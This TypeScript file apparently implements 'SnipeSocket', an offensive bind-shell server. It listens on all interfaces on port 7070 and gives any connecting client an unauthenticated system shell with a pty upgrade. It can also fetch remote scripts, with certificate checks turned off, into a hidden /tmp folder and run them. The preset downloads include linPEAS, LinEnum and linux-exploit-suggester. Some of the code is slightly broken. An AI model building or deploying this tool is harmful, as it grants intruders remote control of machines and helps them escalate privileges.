// Imports
import colors from 'colors/safe';
import { spawn, spawnSync, SpawnOptionsWithoutStdio, ChildProcessWithoutNullStreams } from 'child_process';
import os, { UserInfo } from 'os';
import fs from 'fs';
import net from 'net';
import path from 'path';
import http from 'http';
import https from 'https';
// import tty, { ReadStream, WriteStream } from 'tty';
// import stream, { Duplex, Readable, Writable } from 'stream';

interface F11Module {
  id: number;
  name: string,
  href: string;
  path?: string,
  details: string
}

const LOAD_MAP: { [name: string]: F11Module } = {
  'random.sh': {
    id: 0,
    name: 'random.sh',
    href: 'https://f11snipe.sh/sh/random.sh',
    details: 'Random ASCII Art'
  },
  'slideshow.sh': {
    id: 1,
    name: 'slideshow.sh',
    href: 'https://f11snipe.sh/sh/slideshow.sh',
    details: 'Keep showing random ascii art...'
  },
  'linpeas.sh': {
    id: 2,
    name: 'linpeas.sh',
    href: 'https://f11snipe.sh/sh/linpeas.sh',
    details: 'linPEAS!'
  },
  'le.sh': {
    id: 3,
    name: 'le.sh',
    href: 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh',
    details: 'Linux Enumeration (LinuxEnum.sh)'
  },
  'lse.sh': {
    id: 4,
    name: 'lse.sh',
    href: 'https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh',
    details: 'Linux Smart Enumeration'
  },
  'les.sh': {
    id: 5,
    name: 'les.sh',
    href: 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh',
    details: 'Linux Exploit Suggester'
  },
  'lpc.sh': {
    id: 6,
    name: 'lpc.sh',
    href: 'https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.sh',
    details: 'Linux Privilege Escalation Check Script (bash)'
  },
  'lpc.py': {
    id: 7,
    name: 'lpc.py',
    href: 'https://raw.githubusercontent.com/linted/linuxprivchecker/master/linuxprivchecker.py',
    details: 'Linux Privilege Escalation Check Script (python)'
  },
};

const WEB_HOST = 'https://f11snipe.sh/sh';
const UNIX_SHELLS = ['bash', 'sh'];
const UNIX_DEFAULT = 'bin/sh';
const TMP_DIR = `/tmp/.f11`;
const CMD_PASS = ['ls', 'cat', 'pwd', 'whoami', 'cd', 'curl', 'wget'];

colors.setTheme({
  ok: ['green'],
  good: ['green'],
  warn: ['yellow'],
  info: ['black', 'bgCyan'],
  debug: ['dim', 'cyan', 'italic'],
  details: ['dim', 'cyan', 'italic'],
  error: ['red', 'underline'],
  module: ['red', 'bold', 'underline'],
  fatal: ['white', 'bgRed', 'bold'],
  prompt: ['trap', 'blue', 'bold'],
  pending: ['trap', 'blue', 'bold', 'strikethrough']
});

// Constants
const PROMPT_PREFIX = colors.reset('💀 ')
const DEFAULT_PROMPT = colors['prompt']('f11>') + colors.reset(' ');
let PROMPT = PROMPT_PREFIX + DEFAULT_PROMPT;
const NEWLINE = `\r\n`;
const PORT = 7070;
const HOST = '0.0.0.0';
const STABALIZE = `python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null`;
// Create net tcp server
const server = net.createServer();
// Define empty array of SnipeSocket[] to track open connections
const sockets: SnipeSocket[] = [];
const timestamp = (): string => new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '');

type msgType = 'ok' | 'good' | 'warn' | 'info' | 'debug' | 'error' | 'fatal';

const log = (...args) => console.log( colors.gray(timestamp()), ...args);
const msg = (theme: msgType, body: string, plain?: string) => {
  log(colors[theme](body));
  if (plain) log(plain);
};
const isMac = (): boolean => /darwin/i.test(os.platform());
const isLinux = (): boolean => /linux/i.test(os.platform());
const isWindows = (): boolean => /^win/i.test(os.platform());
const isNotWindows = (): boolean => !isWindows();
const findWinShell = (): string => 'cmd.exe'; // LOL F*#K WINDOWS
const findNixShell = (): string => {
  for (let i = 0; i <  UNIX_SHELLS.length; i++) {
    const shell = UNIX_SHELLS[i];
    const check = spawnSync('which', [shell]);

    if (check.status === 0) {
      const found = check.stdout.toString().trim();
      msg('debug', `Using shell: '${shell}' -> ${found}`);
      return found;
    } else {
      msg('warn', `Unable to find shell: '${shell}'`);

      if (i < UNIX_SHELLS.length - 1) {
        msg('debug', `Trying next shell: ${UNIX_DEFAULT[i+1]} ...`);
      }
    }
  }

  // Return default shell "bin/sh"
  return UNIX_DEFAULT;
}

const findShell = (): string => isNotWindows() ? findNixShell() : findWinShell();

export interface ISystemInfo {
  env: { [key: string]: string|undefined };
  cwd: string;
  pkg: any;
  os: {
    hostname: string;
    platform: string;
    release: string;
    type: string;
  };
  user: UserInfo<string>;
  context: {
    pkg?: any;
    node?: boolean;
    rails?: boolean;
    docker?: boolean;
    dockerCompose?: boolean;
    make?: boolean;
    makefile?: Buffer;
  };
  installPath: string;
}

const getSystemInfo = (): ISystemInfo => ({
  env: process.env,
  cwd: process.cwd(),
  pkg: require('../package'),
  os: {
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    type: os.type()
  },
  user: os.userInfo(),
  context: {},
  installPath: path.join(__dirname, '..')
});

class SnipeSocket {
  public sock: net.Socket;
  public cp: ChildProcessWithoutNullStreams;
  public inShell = false;
  public inSpawn = false;
  public loaded?: any;

  constructor (socket: net.Socket, args: string[] = [], opts?: SpawnOptionsWithoutStdio) {
    this.sock = socket;
    this.sock.on('data', this.onData.bind(this));

    if (!fs.existsSync(TMP_DIR)) fs.mkdirSync(TMP_DIR, { recursive: true });

    const events = ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'ready', 'timeout'];

    events.forEach((e, i) => {
      this.sock.on(e, (...args) => {
        msg('debug', `[${i}] sock.on(${e}): ${JSON.stringify(args)}`);
      });
    })
  }

  public get sysinfo(): ISystemInfo {
    return getSystemInfo();
  }

  public onData (data) {
    msg('debug', `SnipeSocket.onData: ${data}`);

    if (this.cp && this.inShell) {
      this.command(data);
    } else {
      this.handle(data);
    }
  };

  public get sig(): string {
    return `${this.sock.remoteAddress}:${this.sock.remotePort}`
  }

  public reset(doPrompt = true): void {
    PROMPT = PROMPT_PREFIX + DEFAULT_PROMPT;
    this.loaded = undefined;
    this.inShell = false;
    this.cleanup();
    if (doPrompt) this.prompt();
  }

  public command(data: any, cb?: (code: number|null) => void): void {
    if (this.inShell) {
      if (this.cp && this.cp.stdin) {
        const cmd = data.toString().trim();

        if (/^(exit|quit)$/i.test(cmd)) {
          this.reset();
        } else {
          msg('debug', `Send spawn command: ${data}`);
          this.cp.stdin.write(data);
        }
      } else {
        msg('warn', `Unable to send cmd (missing cp or cp.stdin): ${data}`);
      }
    } msg('debug', `Not sending command (not inShell): ${data}`);
  }

  public load(target: string | number, cb?: (code: number|null) => void): void {
    if (this.loaded && this.loaded.name === target) {
      if (cb) cb(0);
      return;
    }

    // TODO: Add find by id (when target is a number)

    if (!LOAD_MAP[target]) {
      this.sock.write(colors['warn'](`Missing/unknown module: ${target}`));
      this.prompt();
      if (cb) cb(1);
      return;
    }

    if (!this.loaded) {
      this.loaded = LOAD_MAP[target];
      PROMPT = colors.reset('💀 [') + colors['module'](this.loaded.name) + colors.reset('] ') + DEFAULT_PROMPT;
    }

    this.prompt();
  }

  public run(file, cb?: (code: number|null) => void) {
    let interpreter = 'bash';

    if (/\.py(thon)?3?$/.test(file)) {
      interpreter = 'python3';
    } else if (/\.php$/.test(file)) {
      interpreter = 'php';
    } else if (/\.rby?$/.test(file)) {
      interpreter = 'ruby';
    }

    this.spawn(interpreter, [file], { shell: true, detached: true }, (code) => {
      this.prompt();
      if (cb) cb(code);
    });
  }

  public download(file, url, cb?: (err?: Error) => void): http.ClientRequest {
    let localFile = fs.createWriteStream(file);

    return https.get(url, { rejectUnauthorized: false }, (response) => {
      const rep = response.headers['content-length'];
      var len = rep ? parseInt(rep, 10) : 0;
      var cur = 0;
      var total = len / 1048576; //1048576 - bytes in 1 Megabyte

      response.on('data', (chunk) => {
        cur += chunk.length;
        this.progress(`Downloading: `, cur, len, total);
      });

      response.on('end', () => {
        msg('debug', 'Download complete');
        if (cb) cb();
      });

      response.pipe(localFile);
    }).on('error', (err) => {
      fs.unlinkSync(file);
      if (cb) cb(err);
    });;
  }

  public progress(msg, cur, max, total) {
    const stamp = colors.yellow(`${msg} - ${(100.0 * cur / max).toFixed(2)}% (${(cur / 1048576).toFixed(2)} MB) of total size: ${total.toFixed(2)} MB`);
    this.sock.write(`\r${stamp}`);
  }

  public prompt(): void {
    // this.cp?.stdin?.write(' ');
    this.sock.write(`${NEWLINE}${PROMPT}`);
  }

  public welcome(art = 'welcome.txt'): void {
    const banner = path.join(__dirname, '../assets', art);
    // let banner = 'assets/welcome.txt';
    let body = 'Welcome to SnipeSocket!';

    try {
      msg('debug', `Loading asset: ${banner}`);

      body = colors.blue(require(banner));
      msg('info', `[PKG] Read banner: ${body}`);
    } catch (err) {
      if (fs.existsSync(banner)) {
        body = colors.blue(fs.readFileSync(banner).toString());
        msg('info', `[F11] Read banner: ${body}`);
      } else {
        console.log(err);
        msg('warn', `Caught error reading msg text files, falling back`);
        body = colors.blue(body);
        // this.sock.write('Welcome!');
      }
    }

    this.sock.write(body);

    this.prompt();
  }

  public spawn(cmd: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
    const defaults: SpawnOptionsWithoutStdio = {
      cwd: TMP_DIR,
      env: process.env
    };

    this.cp = spawn(cmd, args, { ...defaults, ...args });

    this.cp.stdout.on('data', (data) => {
      msg('debug', `SnipeSocket.cp.stdout: ${data}`);
      this.sock.write(data);
    });

    this.cp.stderr.on('data', (data) => {
      msg('debug', `SnipeSocket.cp.stderr: ${data}`);
      this.sock.write(data);
    });

    this.cp.on('close', (code) => {
      msg('debug', `[spawn] Child process exited with code ${code}`);
      this.cleanup();
      if (cb) cb(code);
    });
  }

  public shell(cmd?: string, args: string[] = [], opts?: SpawnOptionsWithoutStdio, cb?: (code: number|null) => void) {
    const target = cmd || findShell();
    this.inShell = true;

    this.spawn(target, args, opts, (code) => {
      this.inShell = false;
      if (cb) cb(code);
    });

    if (isNotWindows()) {
      this.command(`${STABALIZE}\r\n`);
    }
  }

  public cleanup(): void {
    this.cp?.removeAllListeners();
  }

  public handle(data: Buffer) {
    msg('info', `Handle socket data: ${data}`);

    const args = data.toString().trim().split(' ').map(p => p.trim());

    if (!args.length) {
      this.prompt();
      return;
    }

    const cmd = args.shift() as string;

    if (this.inShell) return;

    if (/^w?get|add|download$/i.test(cmd)) {
      const doShit = () => {
        const name = this.loaded?.name || args[0];
        const file = `${TMP_DIR}/${name}`;
        const url = args[1] || this.loaded?.href || `${WEB_HOST}/${name}`;

        this.sock.write(colors.cyan(`Downloading: ${url} -> ${file}`));
        this.sock.write(NEWLINE);

        this.download(file, url, (err) => {
          if (err) msg('error', `Failed downloading: ${url} -> ${file}`);

          LOAD_MAP[name] = {
            id: Object.keys(LOAD_MAP).length,
            name,
            href: url,
            path: file,
            details: args[2] || name
          };

          this.load(name);
        });
      };

      if (this.loaded || args.length > 0) {
        doShit();
      } else {
        // > get linpeas.sh http://f11snipe.sh/sh/linpeas.sh
        this.sock.write(colors['warn'](`Usage: get <file> [<url>] [<details>]`));
        this.prompt();
      }
    } else if (this.loaded) {
      if (/^run$/i.test(cmd)) {
        if (this.loaded?.path) {
          this.run(this.loaded.path);
        } else {
          this.sock.write(colors['warn'](`File not found. Try running "get" to download from ${this.loaded?.href}`));
          this.prompt();
        }
      } else if (/^stop|kill|back|exit$/i.test(cmd)) {
        this.cp?.kill();
        this.reset();
      }
    } else if (/^sh|bash|shell$/i.test(cmd)) {
      this.shell();
    } else if (Object.keys(LOAD_MAP).includes(cmd)) {
      this.load(cmd);
    } else if (/^use|load$/i.test(cmd)) {
      if (!args[0]) {
        this.sock.write(colors.red(`Missing module: "use|load <module>"`));
        this.prompt();
      } else {
        this.load(args[0]);
      }
    } else if (/^ls|list|show/i.test(cmd)) {
      this.sock.write(colors.cyan(`Available modules:\r\n`));
      Object.keys(LOAD_MAP).forEach(name => {
        const mod = LOAD_MAP[name];

        this.sock.write(NEWLINE);
        this.sock.write(colors.gray(`\t#${mod.id} [`) + colors['module'](name) + colors.gray(`] `));
        this.sock.write(NEWLINE);
        this.sock.write(colors['details'](`\t\t- ${mod.details} (${mod.href})`));
      });

      this.sock.write(NEWLINE);
      this.prompt();
    } else {
      this.sock.write(colors['warn'](`Command not found: '${cmd}'`));
      this.prompt();
    }
  }
}

// Intialize and listen for connections
server.listen(PORT, HOST, () => {
  msg('good', `F11snipe Server Started!`);
  msg('good', `Listening: ${HOST}:${PORT}`);
  msg('good', `SHELL: ${findShell()}`)
});

// console.log('process.__nexe', process['__nexe']);
// console.log('process.env', process['env']);
// console.log('process.args', process.argv.join(' '));
// console.log('getSystemInfo()', getSystemInfo());

// Main handler for new connections
server.on('connection', (sock: net.Socket) => {
  const socket = new SnipeSocket(sock);
  sockets.push(socket);

  msg('info', `[${socket.sig}] New Connection`);

  try {
    socket.reset(false);
    socket.welcome('welcome.txt');

    socket.sock.on('close', (hadError: boolean) => {
      if (hadError) log(`Socket.on(close) with error!`);
      let idx = sockets.findIndex((sock) => sock.sig === socket.sig);
      if (idx >= 0) {
        sockets.splice(idx, 1);
      }

      msg('info', `[${socket.sig}] Closed Connection`);
    });
  } catch (err: any) {
    msg('fatal', `Caught connection error: ${err.message}`);
  }
});
